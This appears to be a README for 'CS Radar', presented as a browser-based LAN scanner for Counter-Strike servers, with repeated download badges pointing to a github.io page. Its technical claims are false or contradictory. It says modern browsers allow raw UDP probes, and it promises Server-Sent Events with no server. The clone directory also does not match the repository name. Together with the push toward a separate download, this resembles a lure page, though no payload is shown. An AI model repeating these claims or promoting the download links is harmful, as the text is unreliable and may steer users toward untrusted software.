# CS Radar v1.0 - LAN Scanner 2026

> **A browser-based LAN scanner that actively probes your local network for Counter-Strike servers using A2S_INFO queries, delivering real-time results through Server-Sent Events.** This tool helps gamers and server administrators quickly discover all active Counter-Strike game servers on their local network without manual port scanning.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/loganm81/csradar-win-31372?style=flat-square)](https://github.com/loganm81/csradar-win-31372)

---

<p align="center">
  <a href="https://loganm81.github.io/csradar-win-31372/">
    <img src="https://img.shields.io/badge/Download-CS%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download CS Radar">
  </a>
</p>

> **[Direct Download - CS Radar v1.0](https://loganm81.github.io/csradar-win-31372/)**

---

[Download Latest Build](https://loganm81.github.io/csradar-win-31372/)

---

## About CS Radar

CS Radar transforms your web browser into a powerful network discovery tool built specifically for Counter-Strike server detection. Instead of relying on static server lists or manual IP checks, this scanner sends active UDP probes across your local subnet and interprets the A2S_INFO responses to identify running game servers. The result is a live, updating view of every Counter-Strike instance on your network, complete with server details like player counts, map names, and game version.

This tool is ideal for LAN party organizers, competitive players, and network administrators who need to quickly locate game servers without third-party software. The retro terminal aesthetic paired with an animated radar favicon gives it a distinct character while maintaining full functionality. CS Radar handles scanning concurrency intelligently, preventing network overload while still delivering fast results.

---

## Features

- **Active UDP Scanning** - Probes your local network using A2S_INFO requests to discover Counter-Strike servers
- **Real-Time Results via SSE** - Server-Sent Events push updates instantly as servers are found
- **Automatic Game Version Detection** - Identifies which Counter-Strike version each server runs
- **Manual IP Query** - Check a specific IP address for server information on demand
- **Concurrency-Controlled Scanning** - Adjustable scan speed prevents network congestion
- **Server Info Display** - Shows player counts, map, hostname, and game type
- **Copy-to-Connect** - One-click copying of server connection strings
- **Animated Radar Favicon** - Visual feedback in browser tabs during scanning
- **Retro Terminal UI** - Classic green-on-black aesthetic with functional layout

---

## Installation

CS Radar is a client-side web application with no build process required.

```bash
git clone https://github.com/loganm81/csradar-win-31372.git
cd CSRadar-LAN-Scanner
```

Open `index.html` in any modern web browser. No server or dependencies needed.

---

## Usage

1. **Start Scanning** - Click the "Scan" button to begin probing your local network
2. **View Results** - Watch as servers appear in real time with full details
3. **Filter Results** - Use the search bar to find specific servers by name or IP
4. **Connect** - Click the copy icon next to any server to get the connection string
5. **Manual Query** - Enter an IP address in the manual query field for targeted checks

Example workflow:
- Launch CS Radar in your browser
- Press "Scan" to start network discovery
- Wait for results to populate (typically 5-30 seconds depending on network size)
- Click a server to view detailed information
- Use "Copy to Connect" to paste the address into your game client

---

## Configuration

All settings are stored in your browser's local storage and persist between sessions. Adjust these parameters from the settings panel:

- **Scan Range** - Define the IP range to scan (default: your local subnet)
- **Concurrency Level** - Number of simultaneous probes (1-50, default: 10)
- **Timeout** - Milliseconds to wait for server responses (default: 2000ms)
- **Port Range** - UDP ports to check (default: 27015-27020)

---

## Requirements

- **Platform** - Any modern web browser (Chrome, Firefox, Edge, Safari)
- **Runtime** - No server required; runs entirely client-side
- **Network** - Local network access for UDP scanning
- **Storage** - Minimal; settings stored in browser local storage
- **Permissions** - Browser must allow UDP connections (works in all modern browsers)

---

## FAQ

**Q: Does CS Radar work on external networks?**
A: No, it is designed specifically for local network scanning and will not probe external IPs or the internet.

**Q: Can I scan for other games?**
A: The tool is optimized for Counter-Strike's A2S_INFO protocol, but may detect other Source-engine servers on the same network.

**Q: How do I update the scanner?**
A: Simply download the latest version from the repository and replace your existing files. No data migration is needed.

**Q: Why are some servers not showing up?**
A: Ensure the servers are running and your firewall allows UDP traffic on the scanned ports. Some routers may block multicast discovery.

**Q: Is there a command-line version?**
A: Currently CS Radar is browser-only, but the scanning logic could be adapted for CLI use in future releases.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
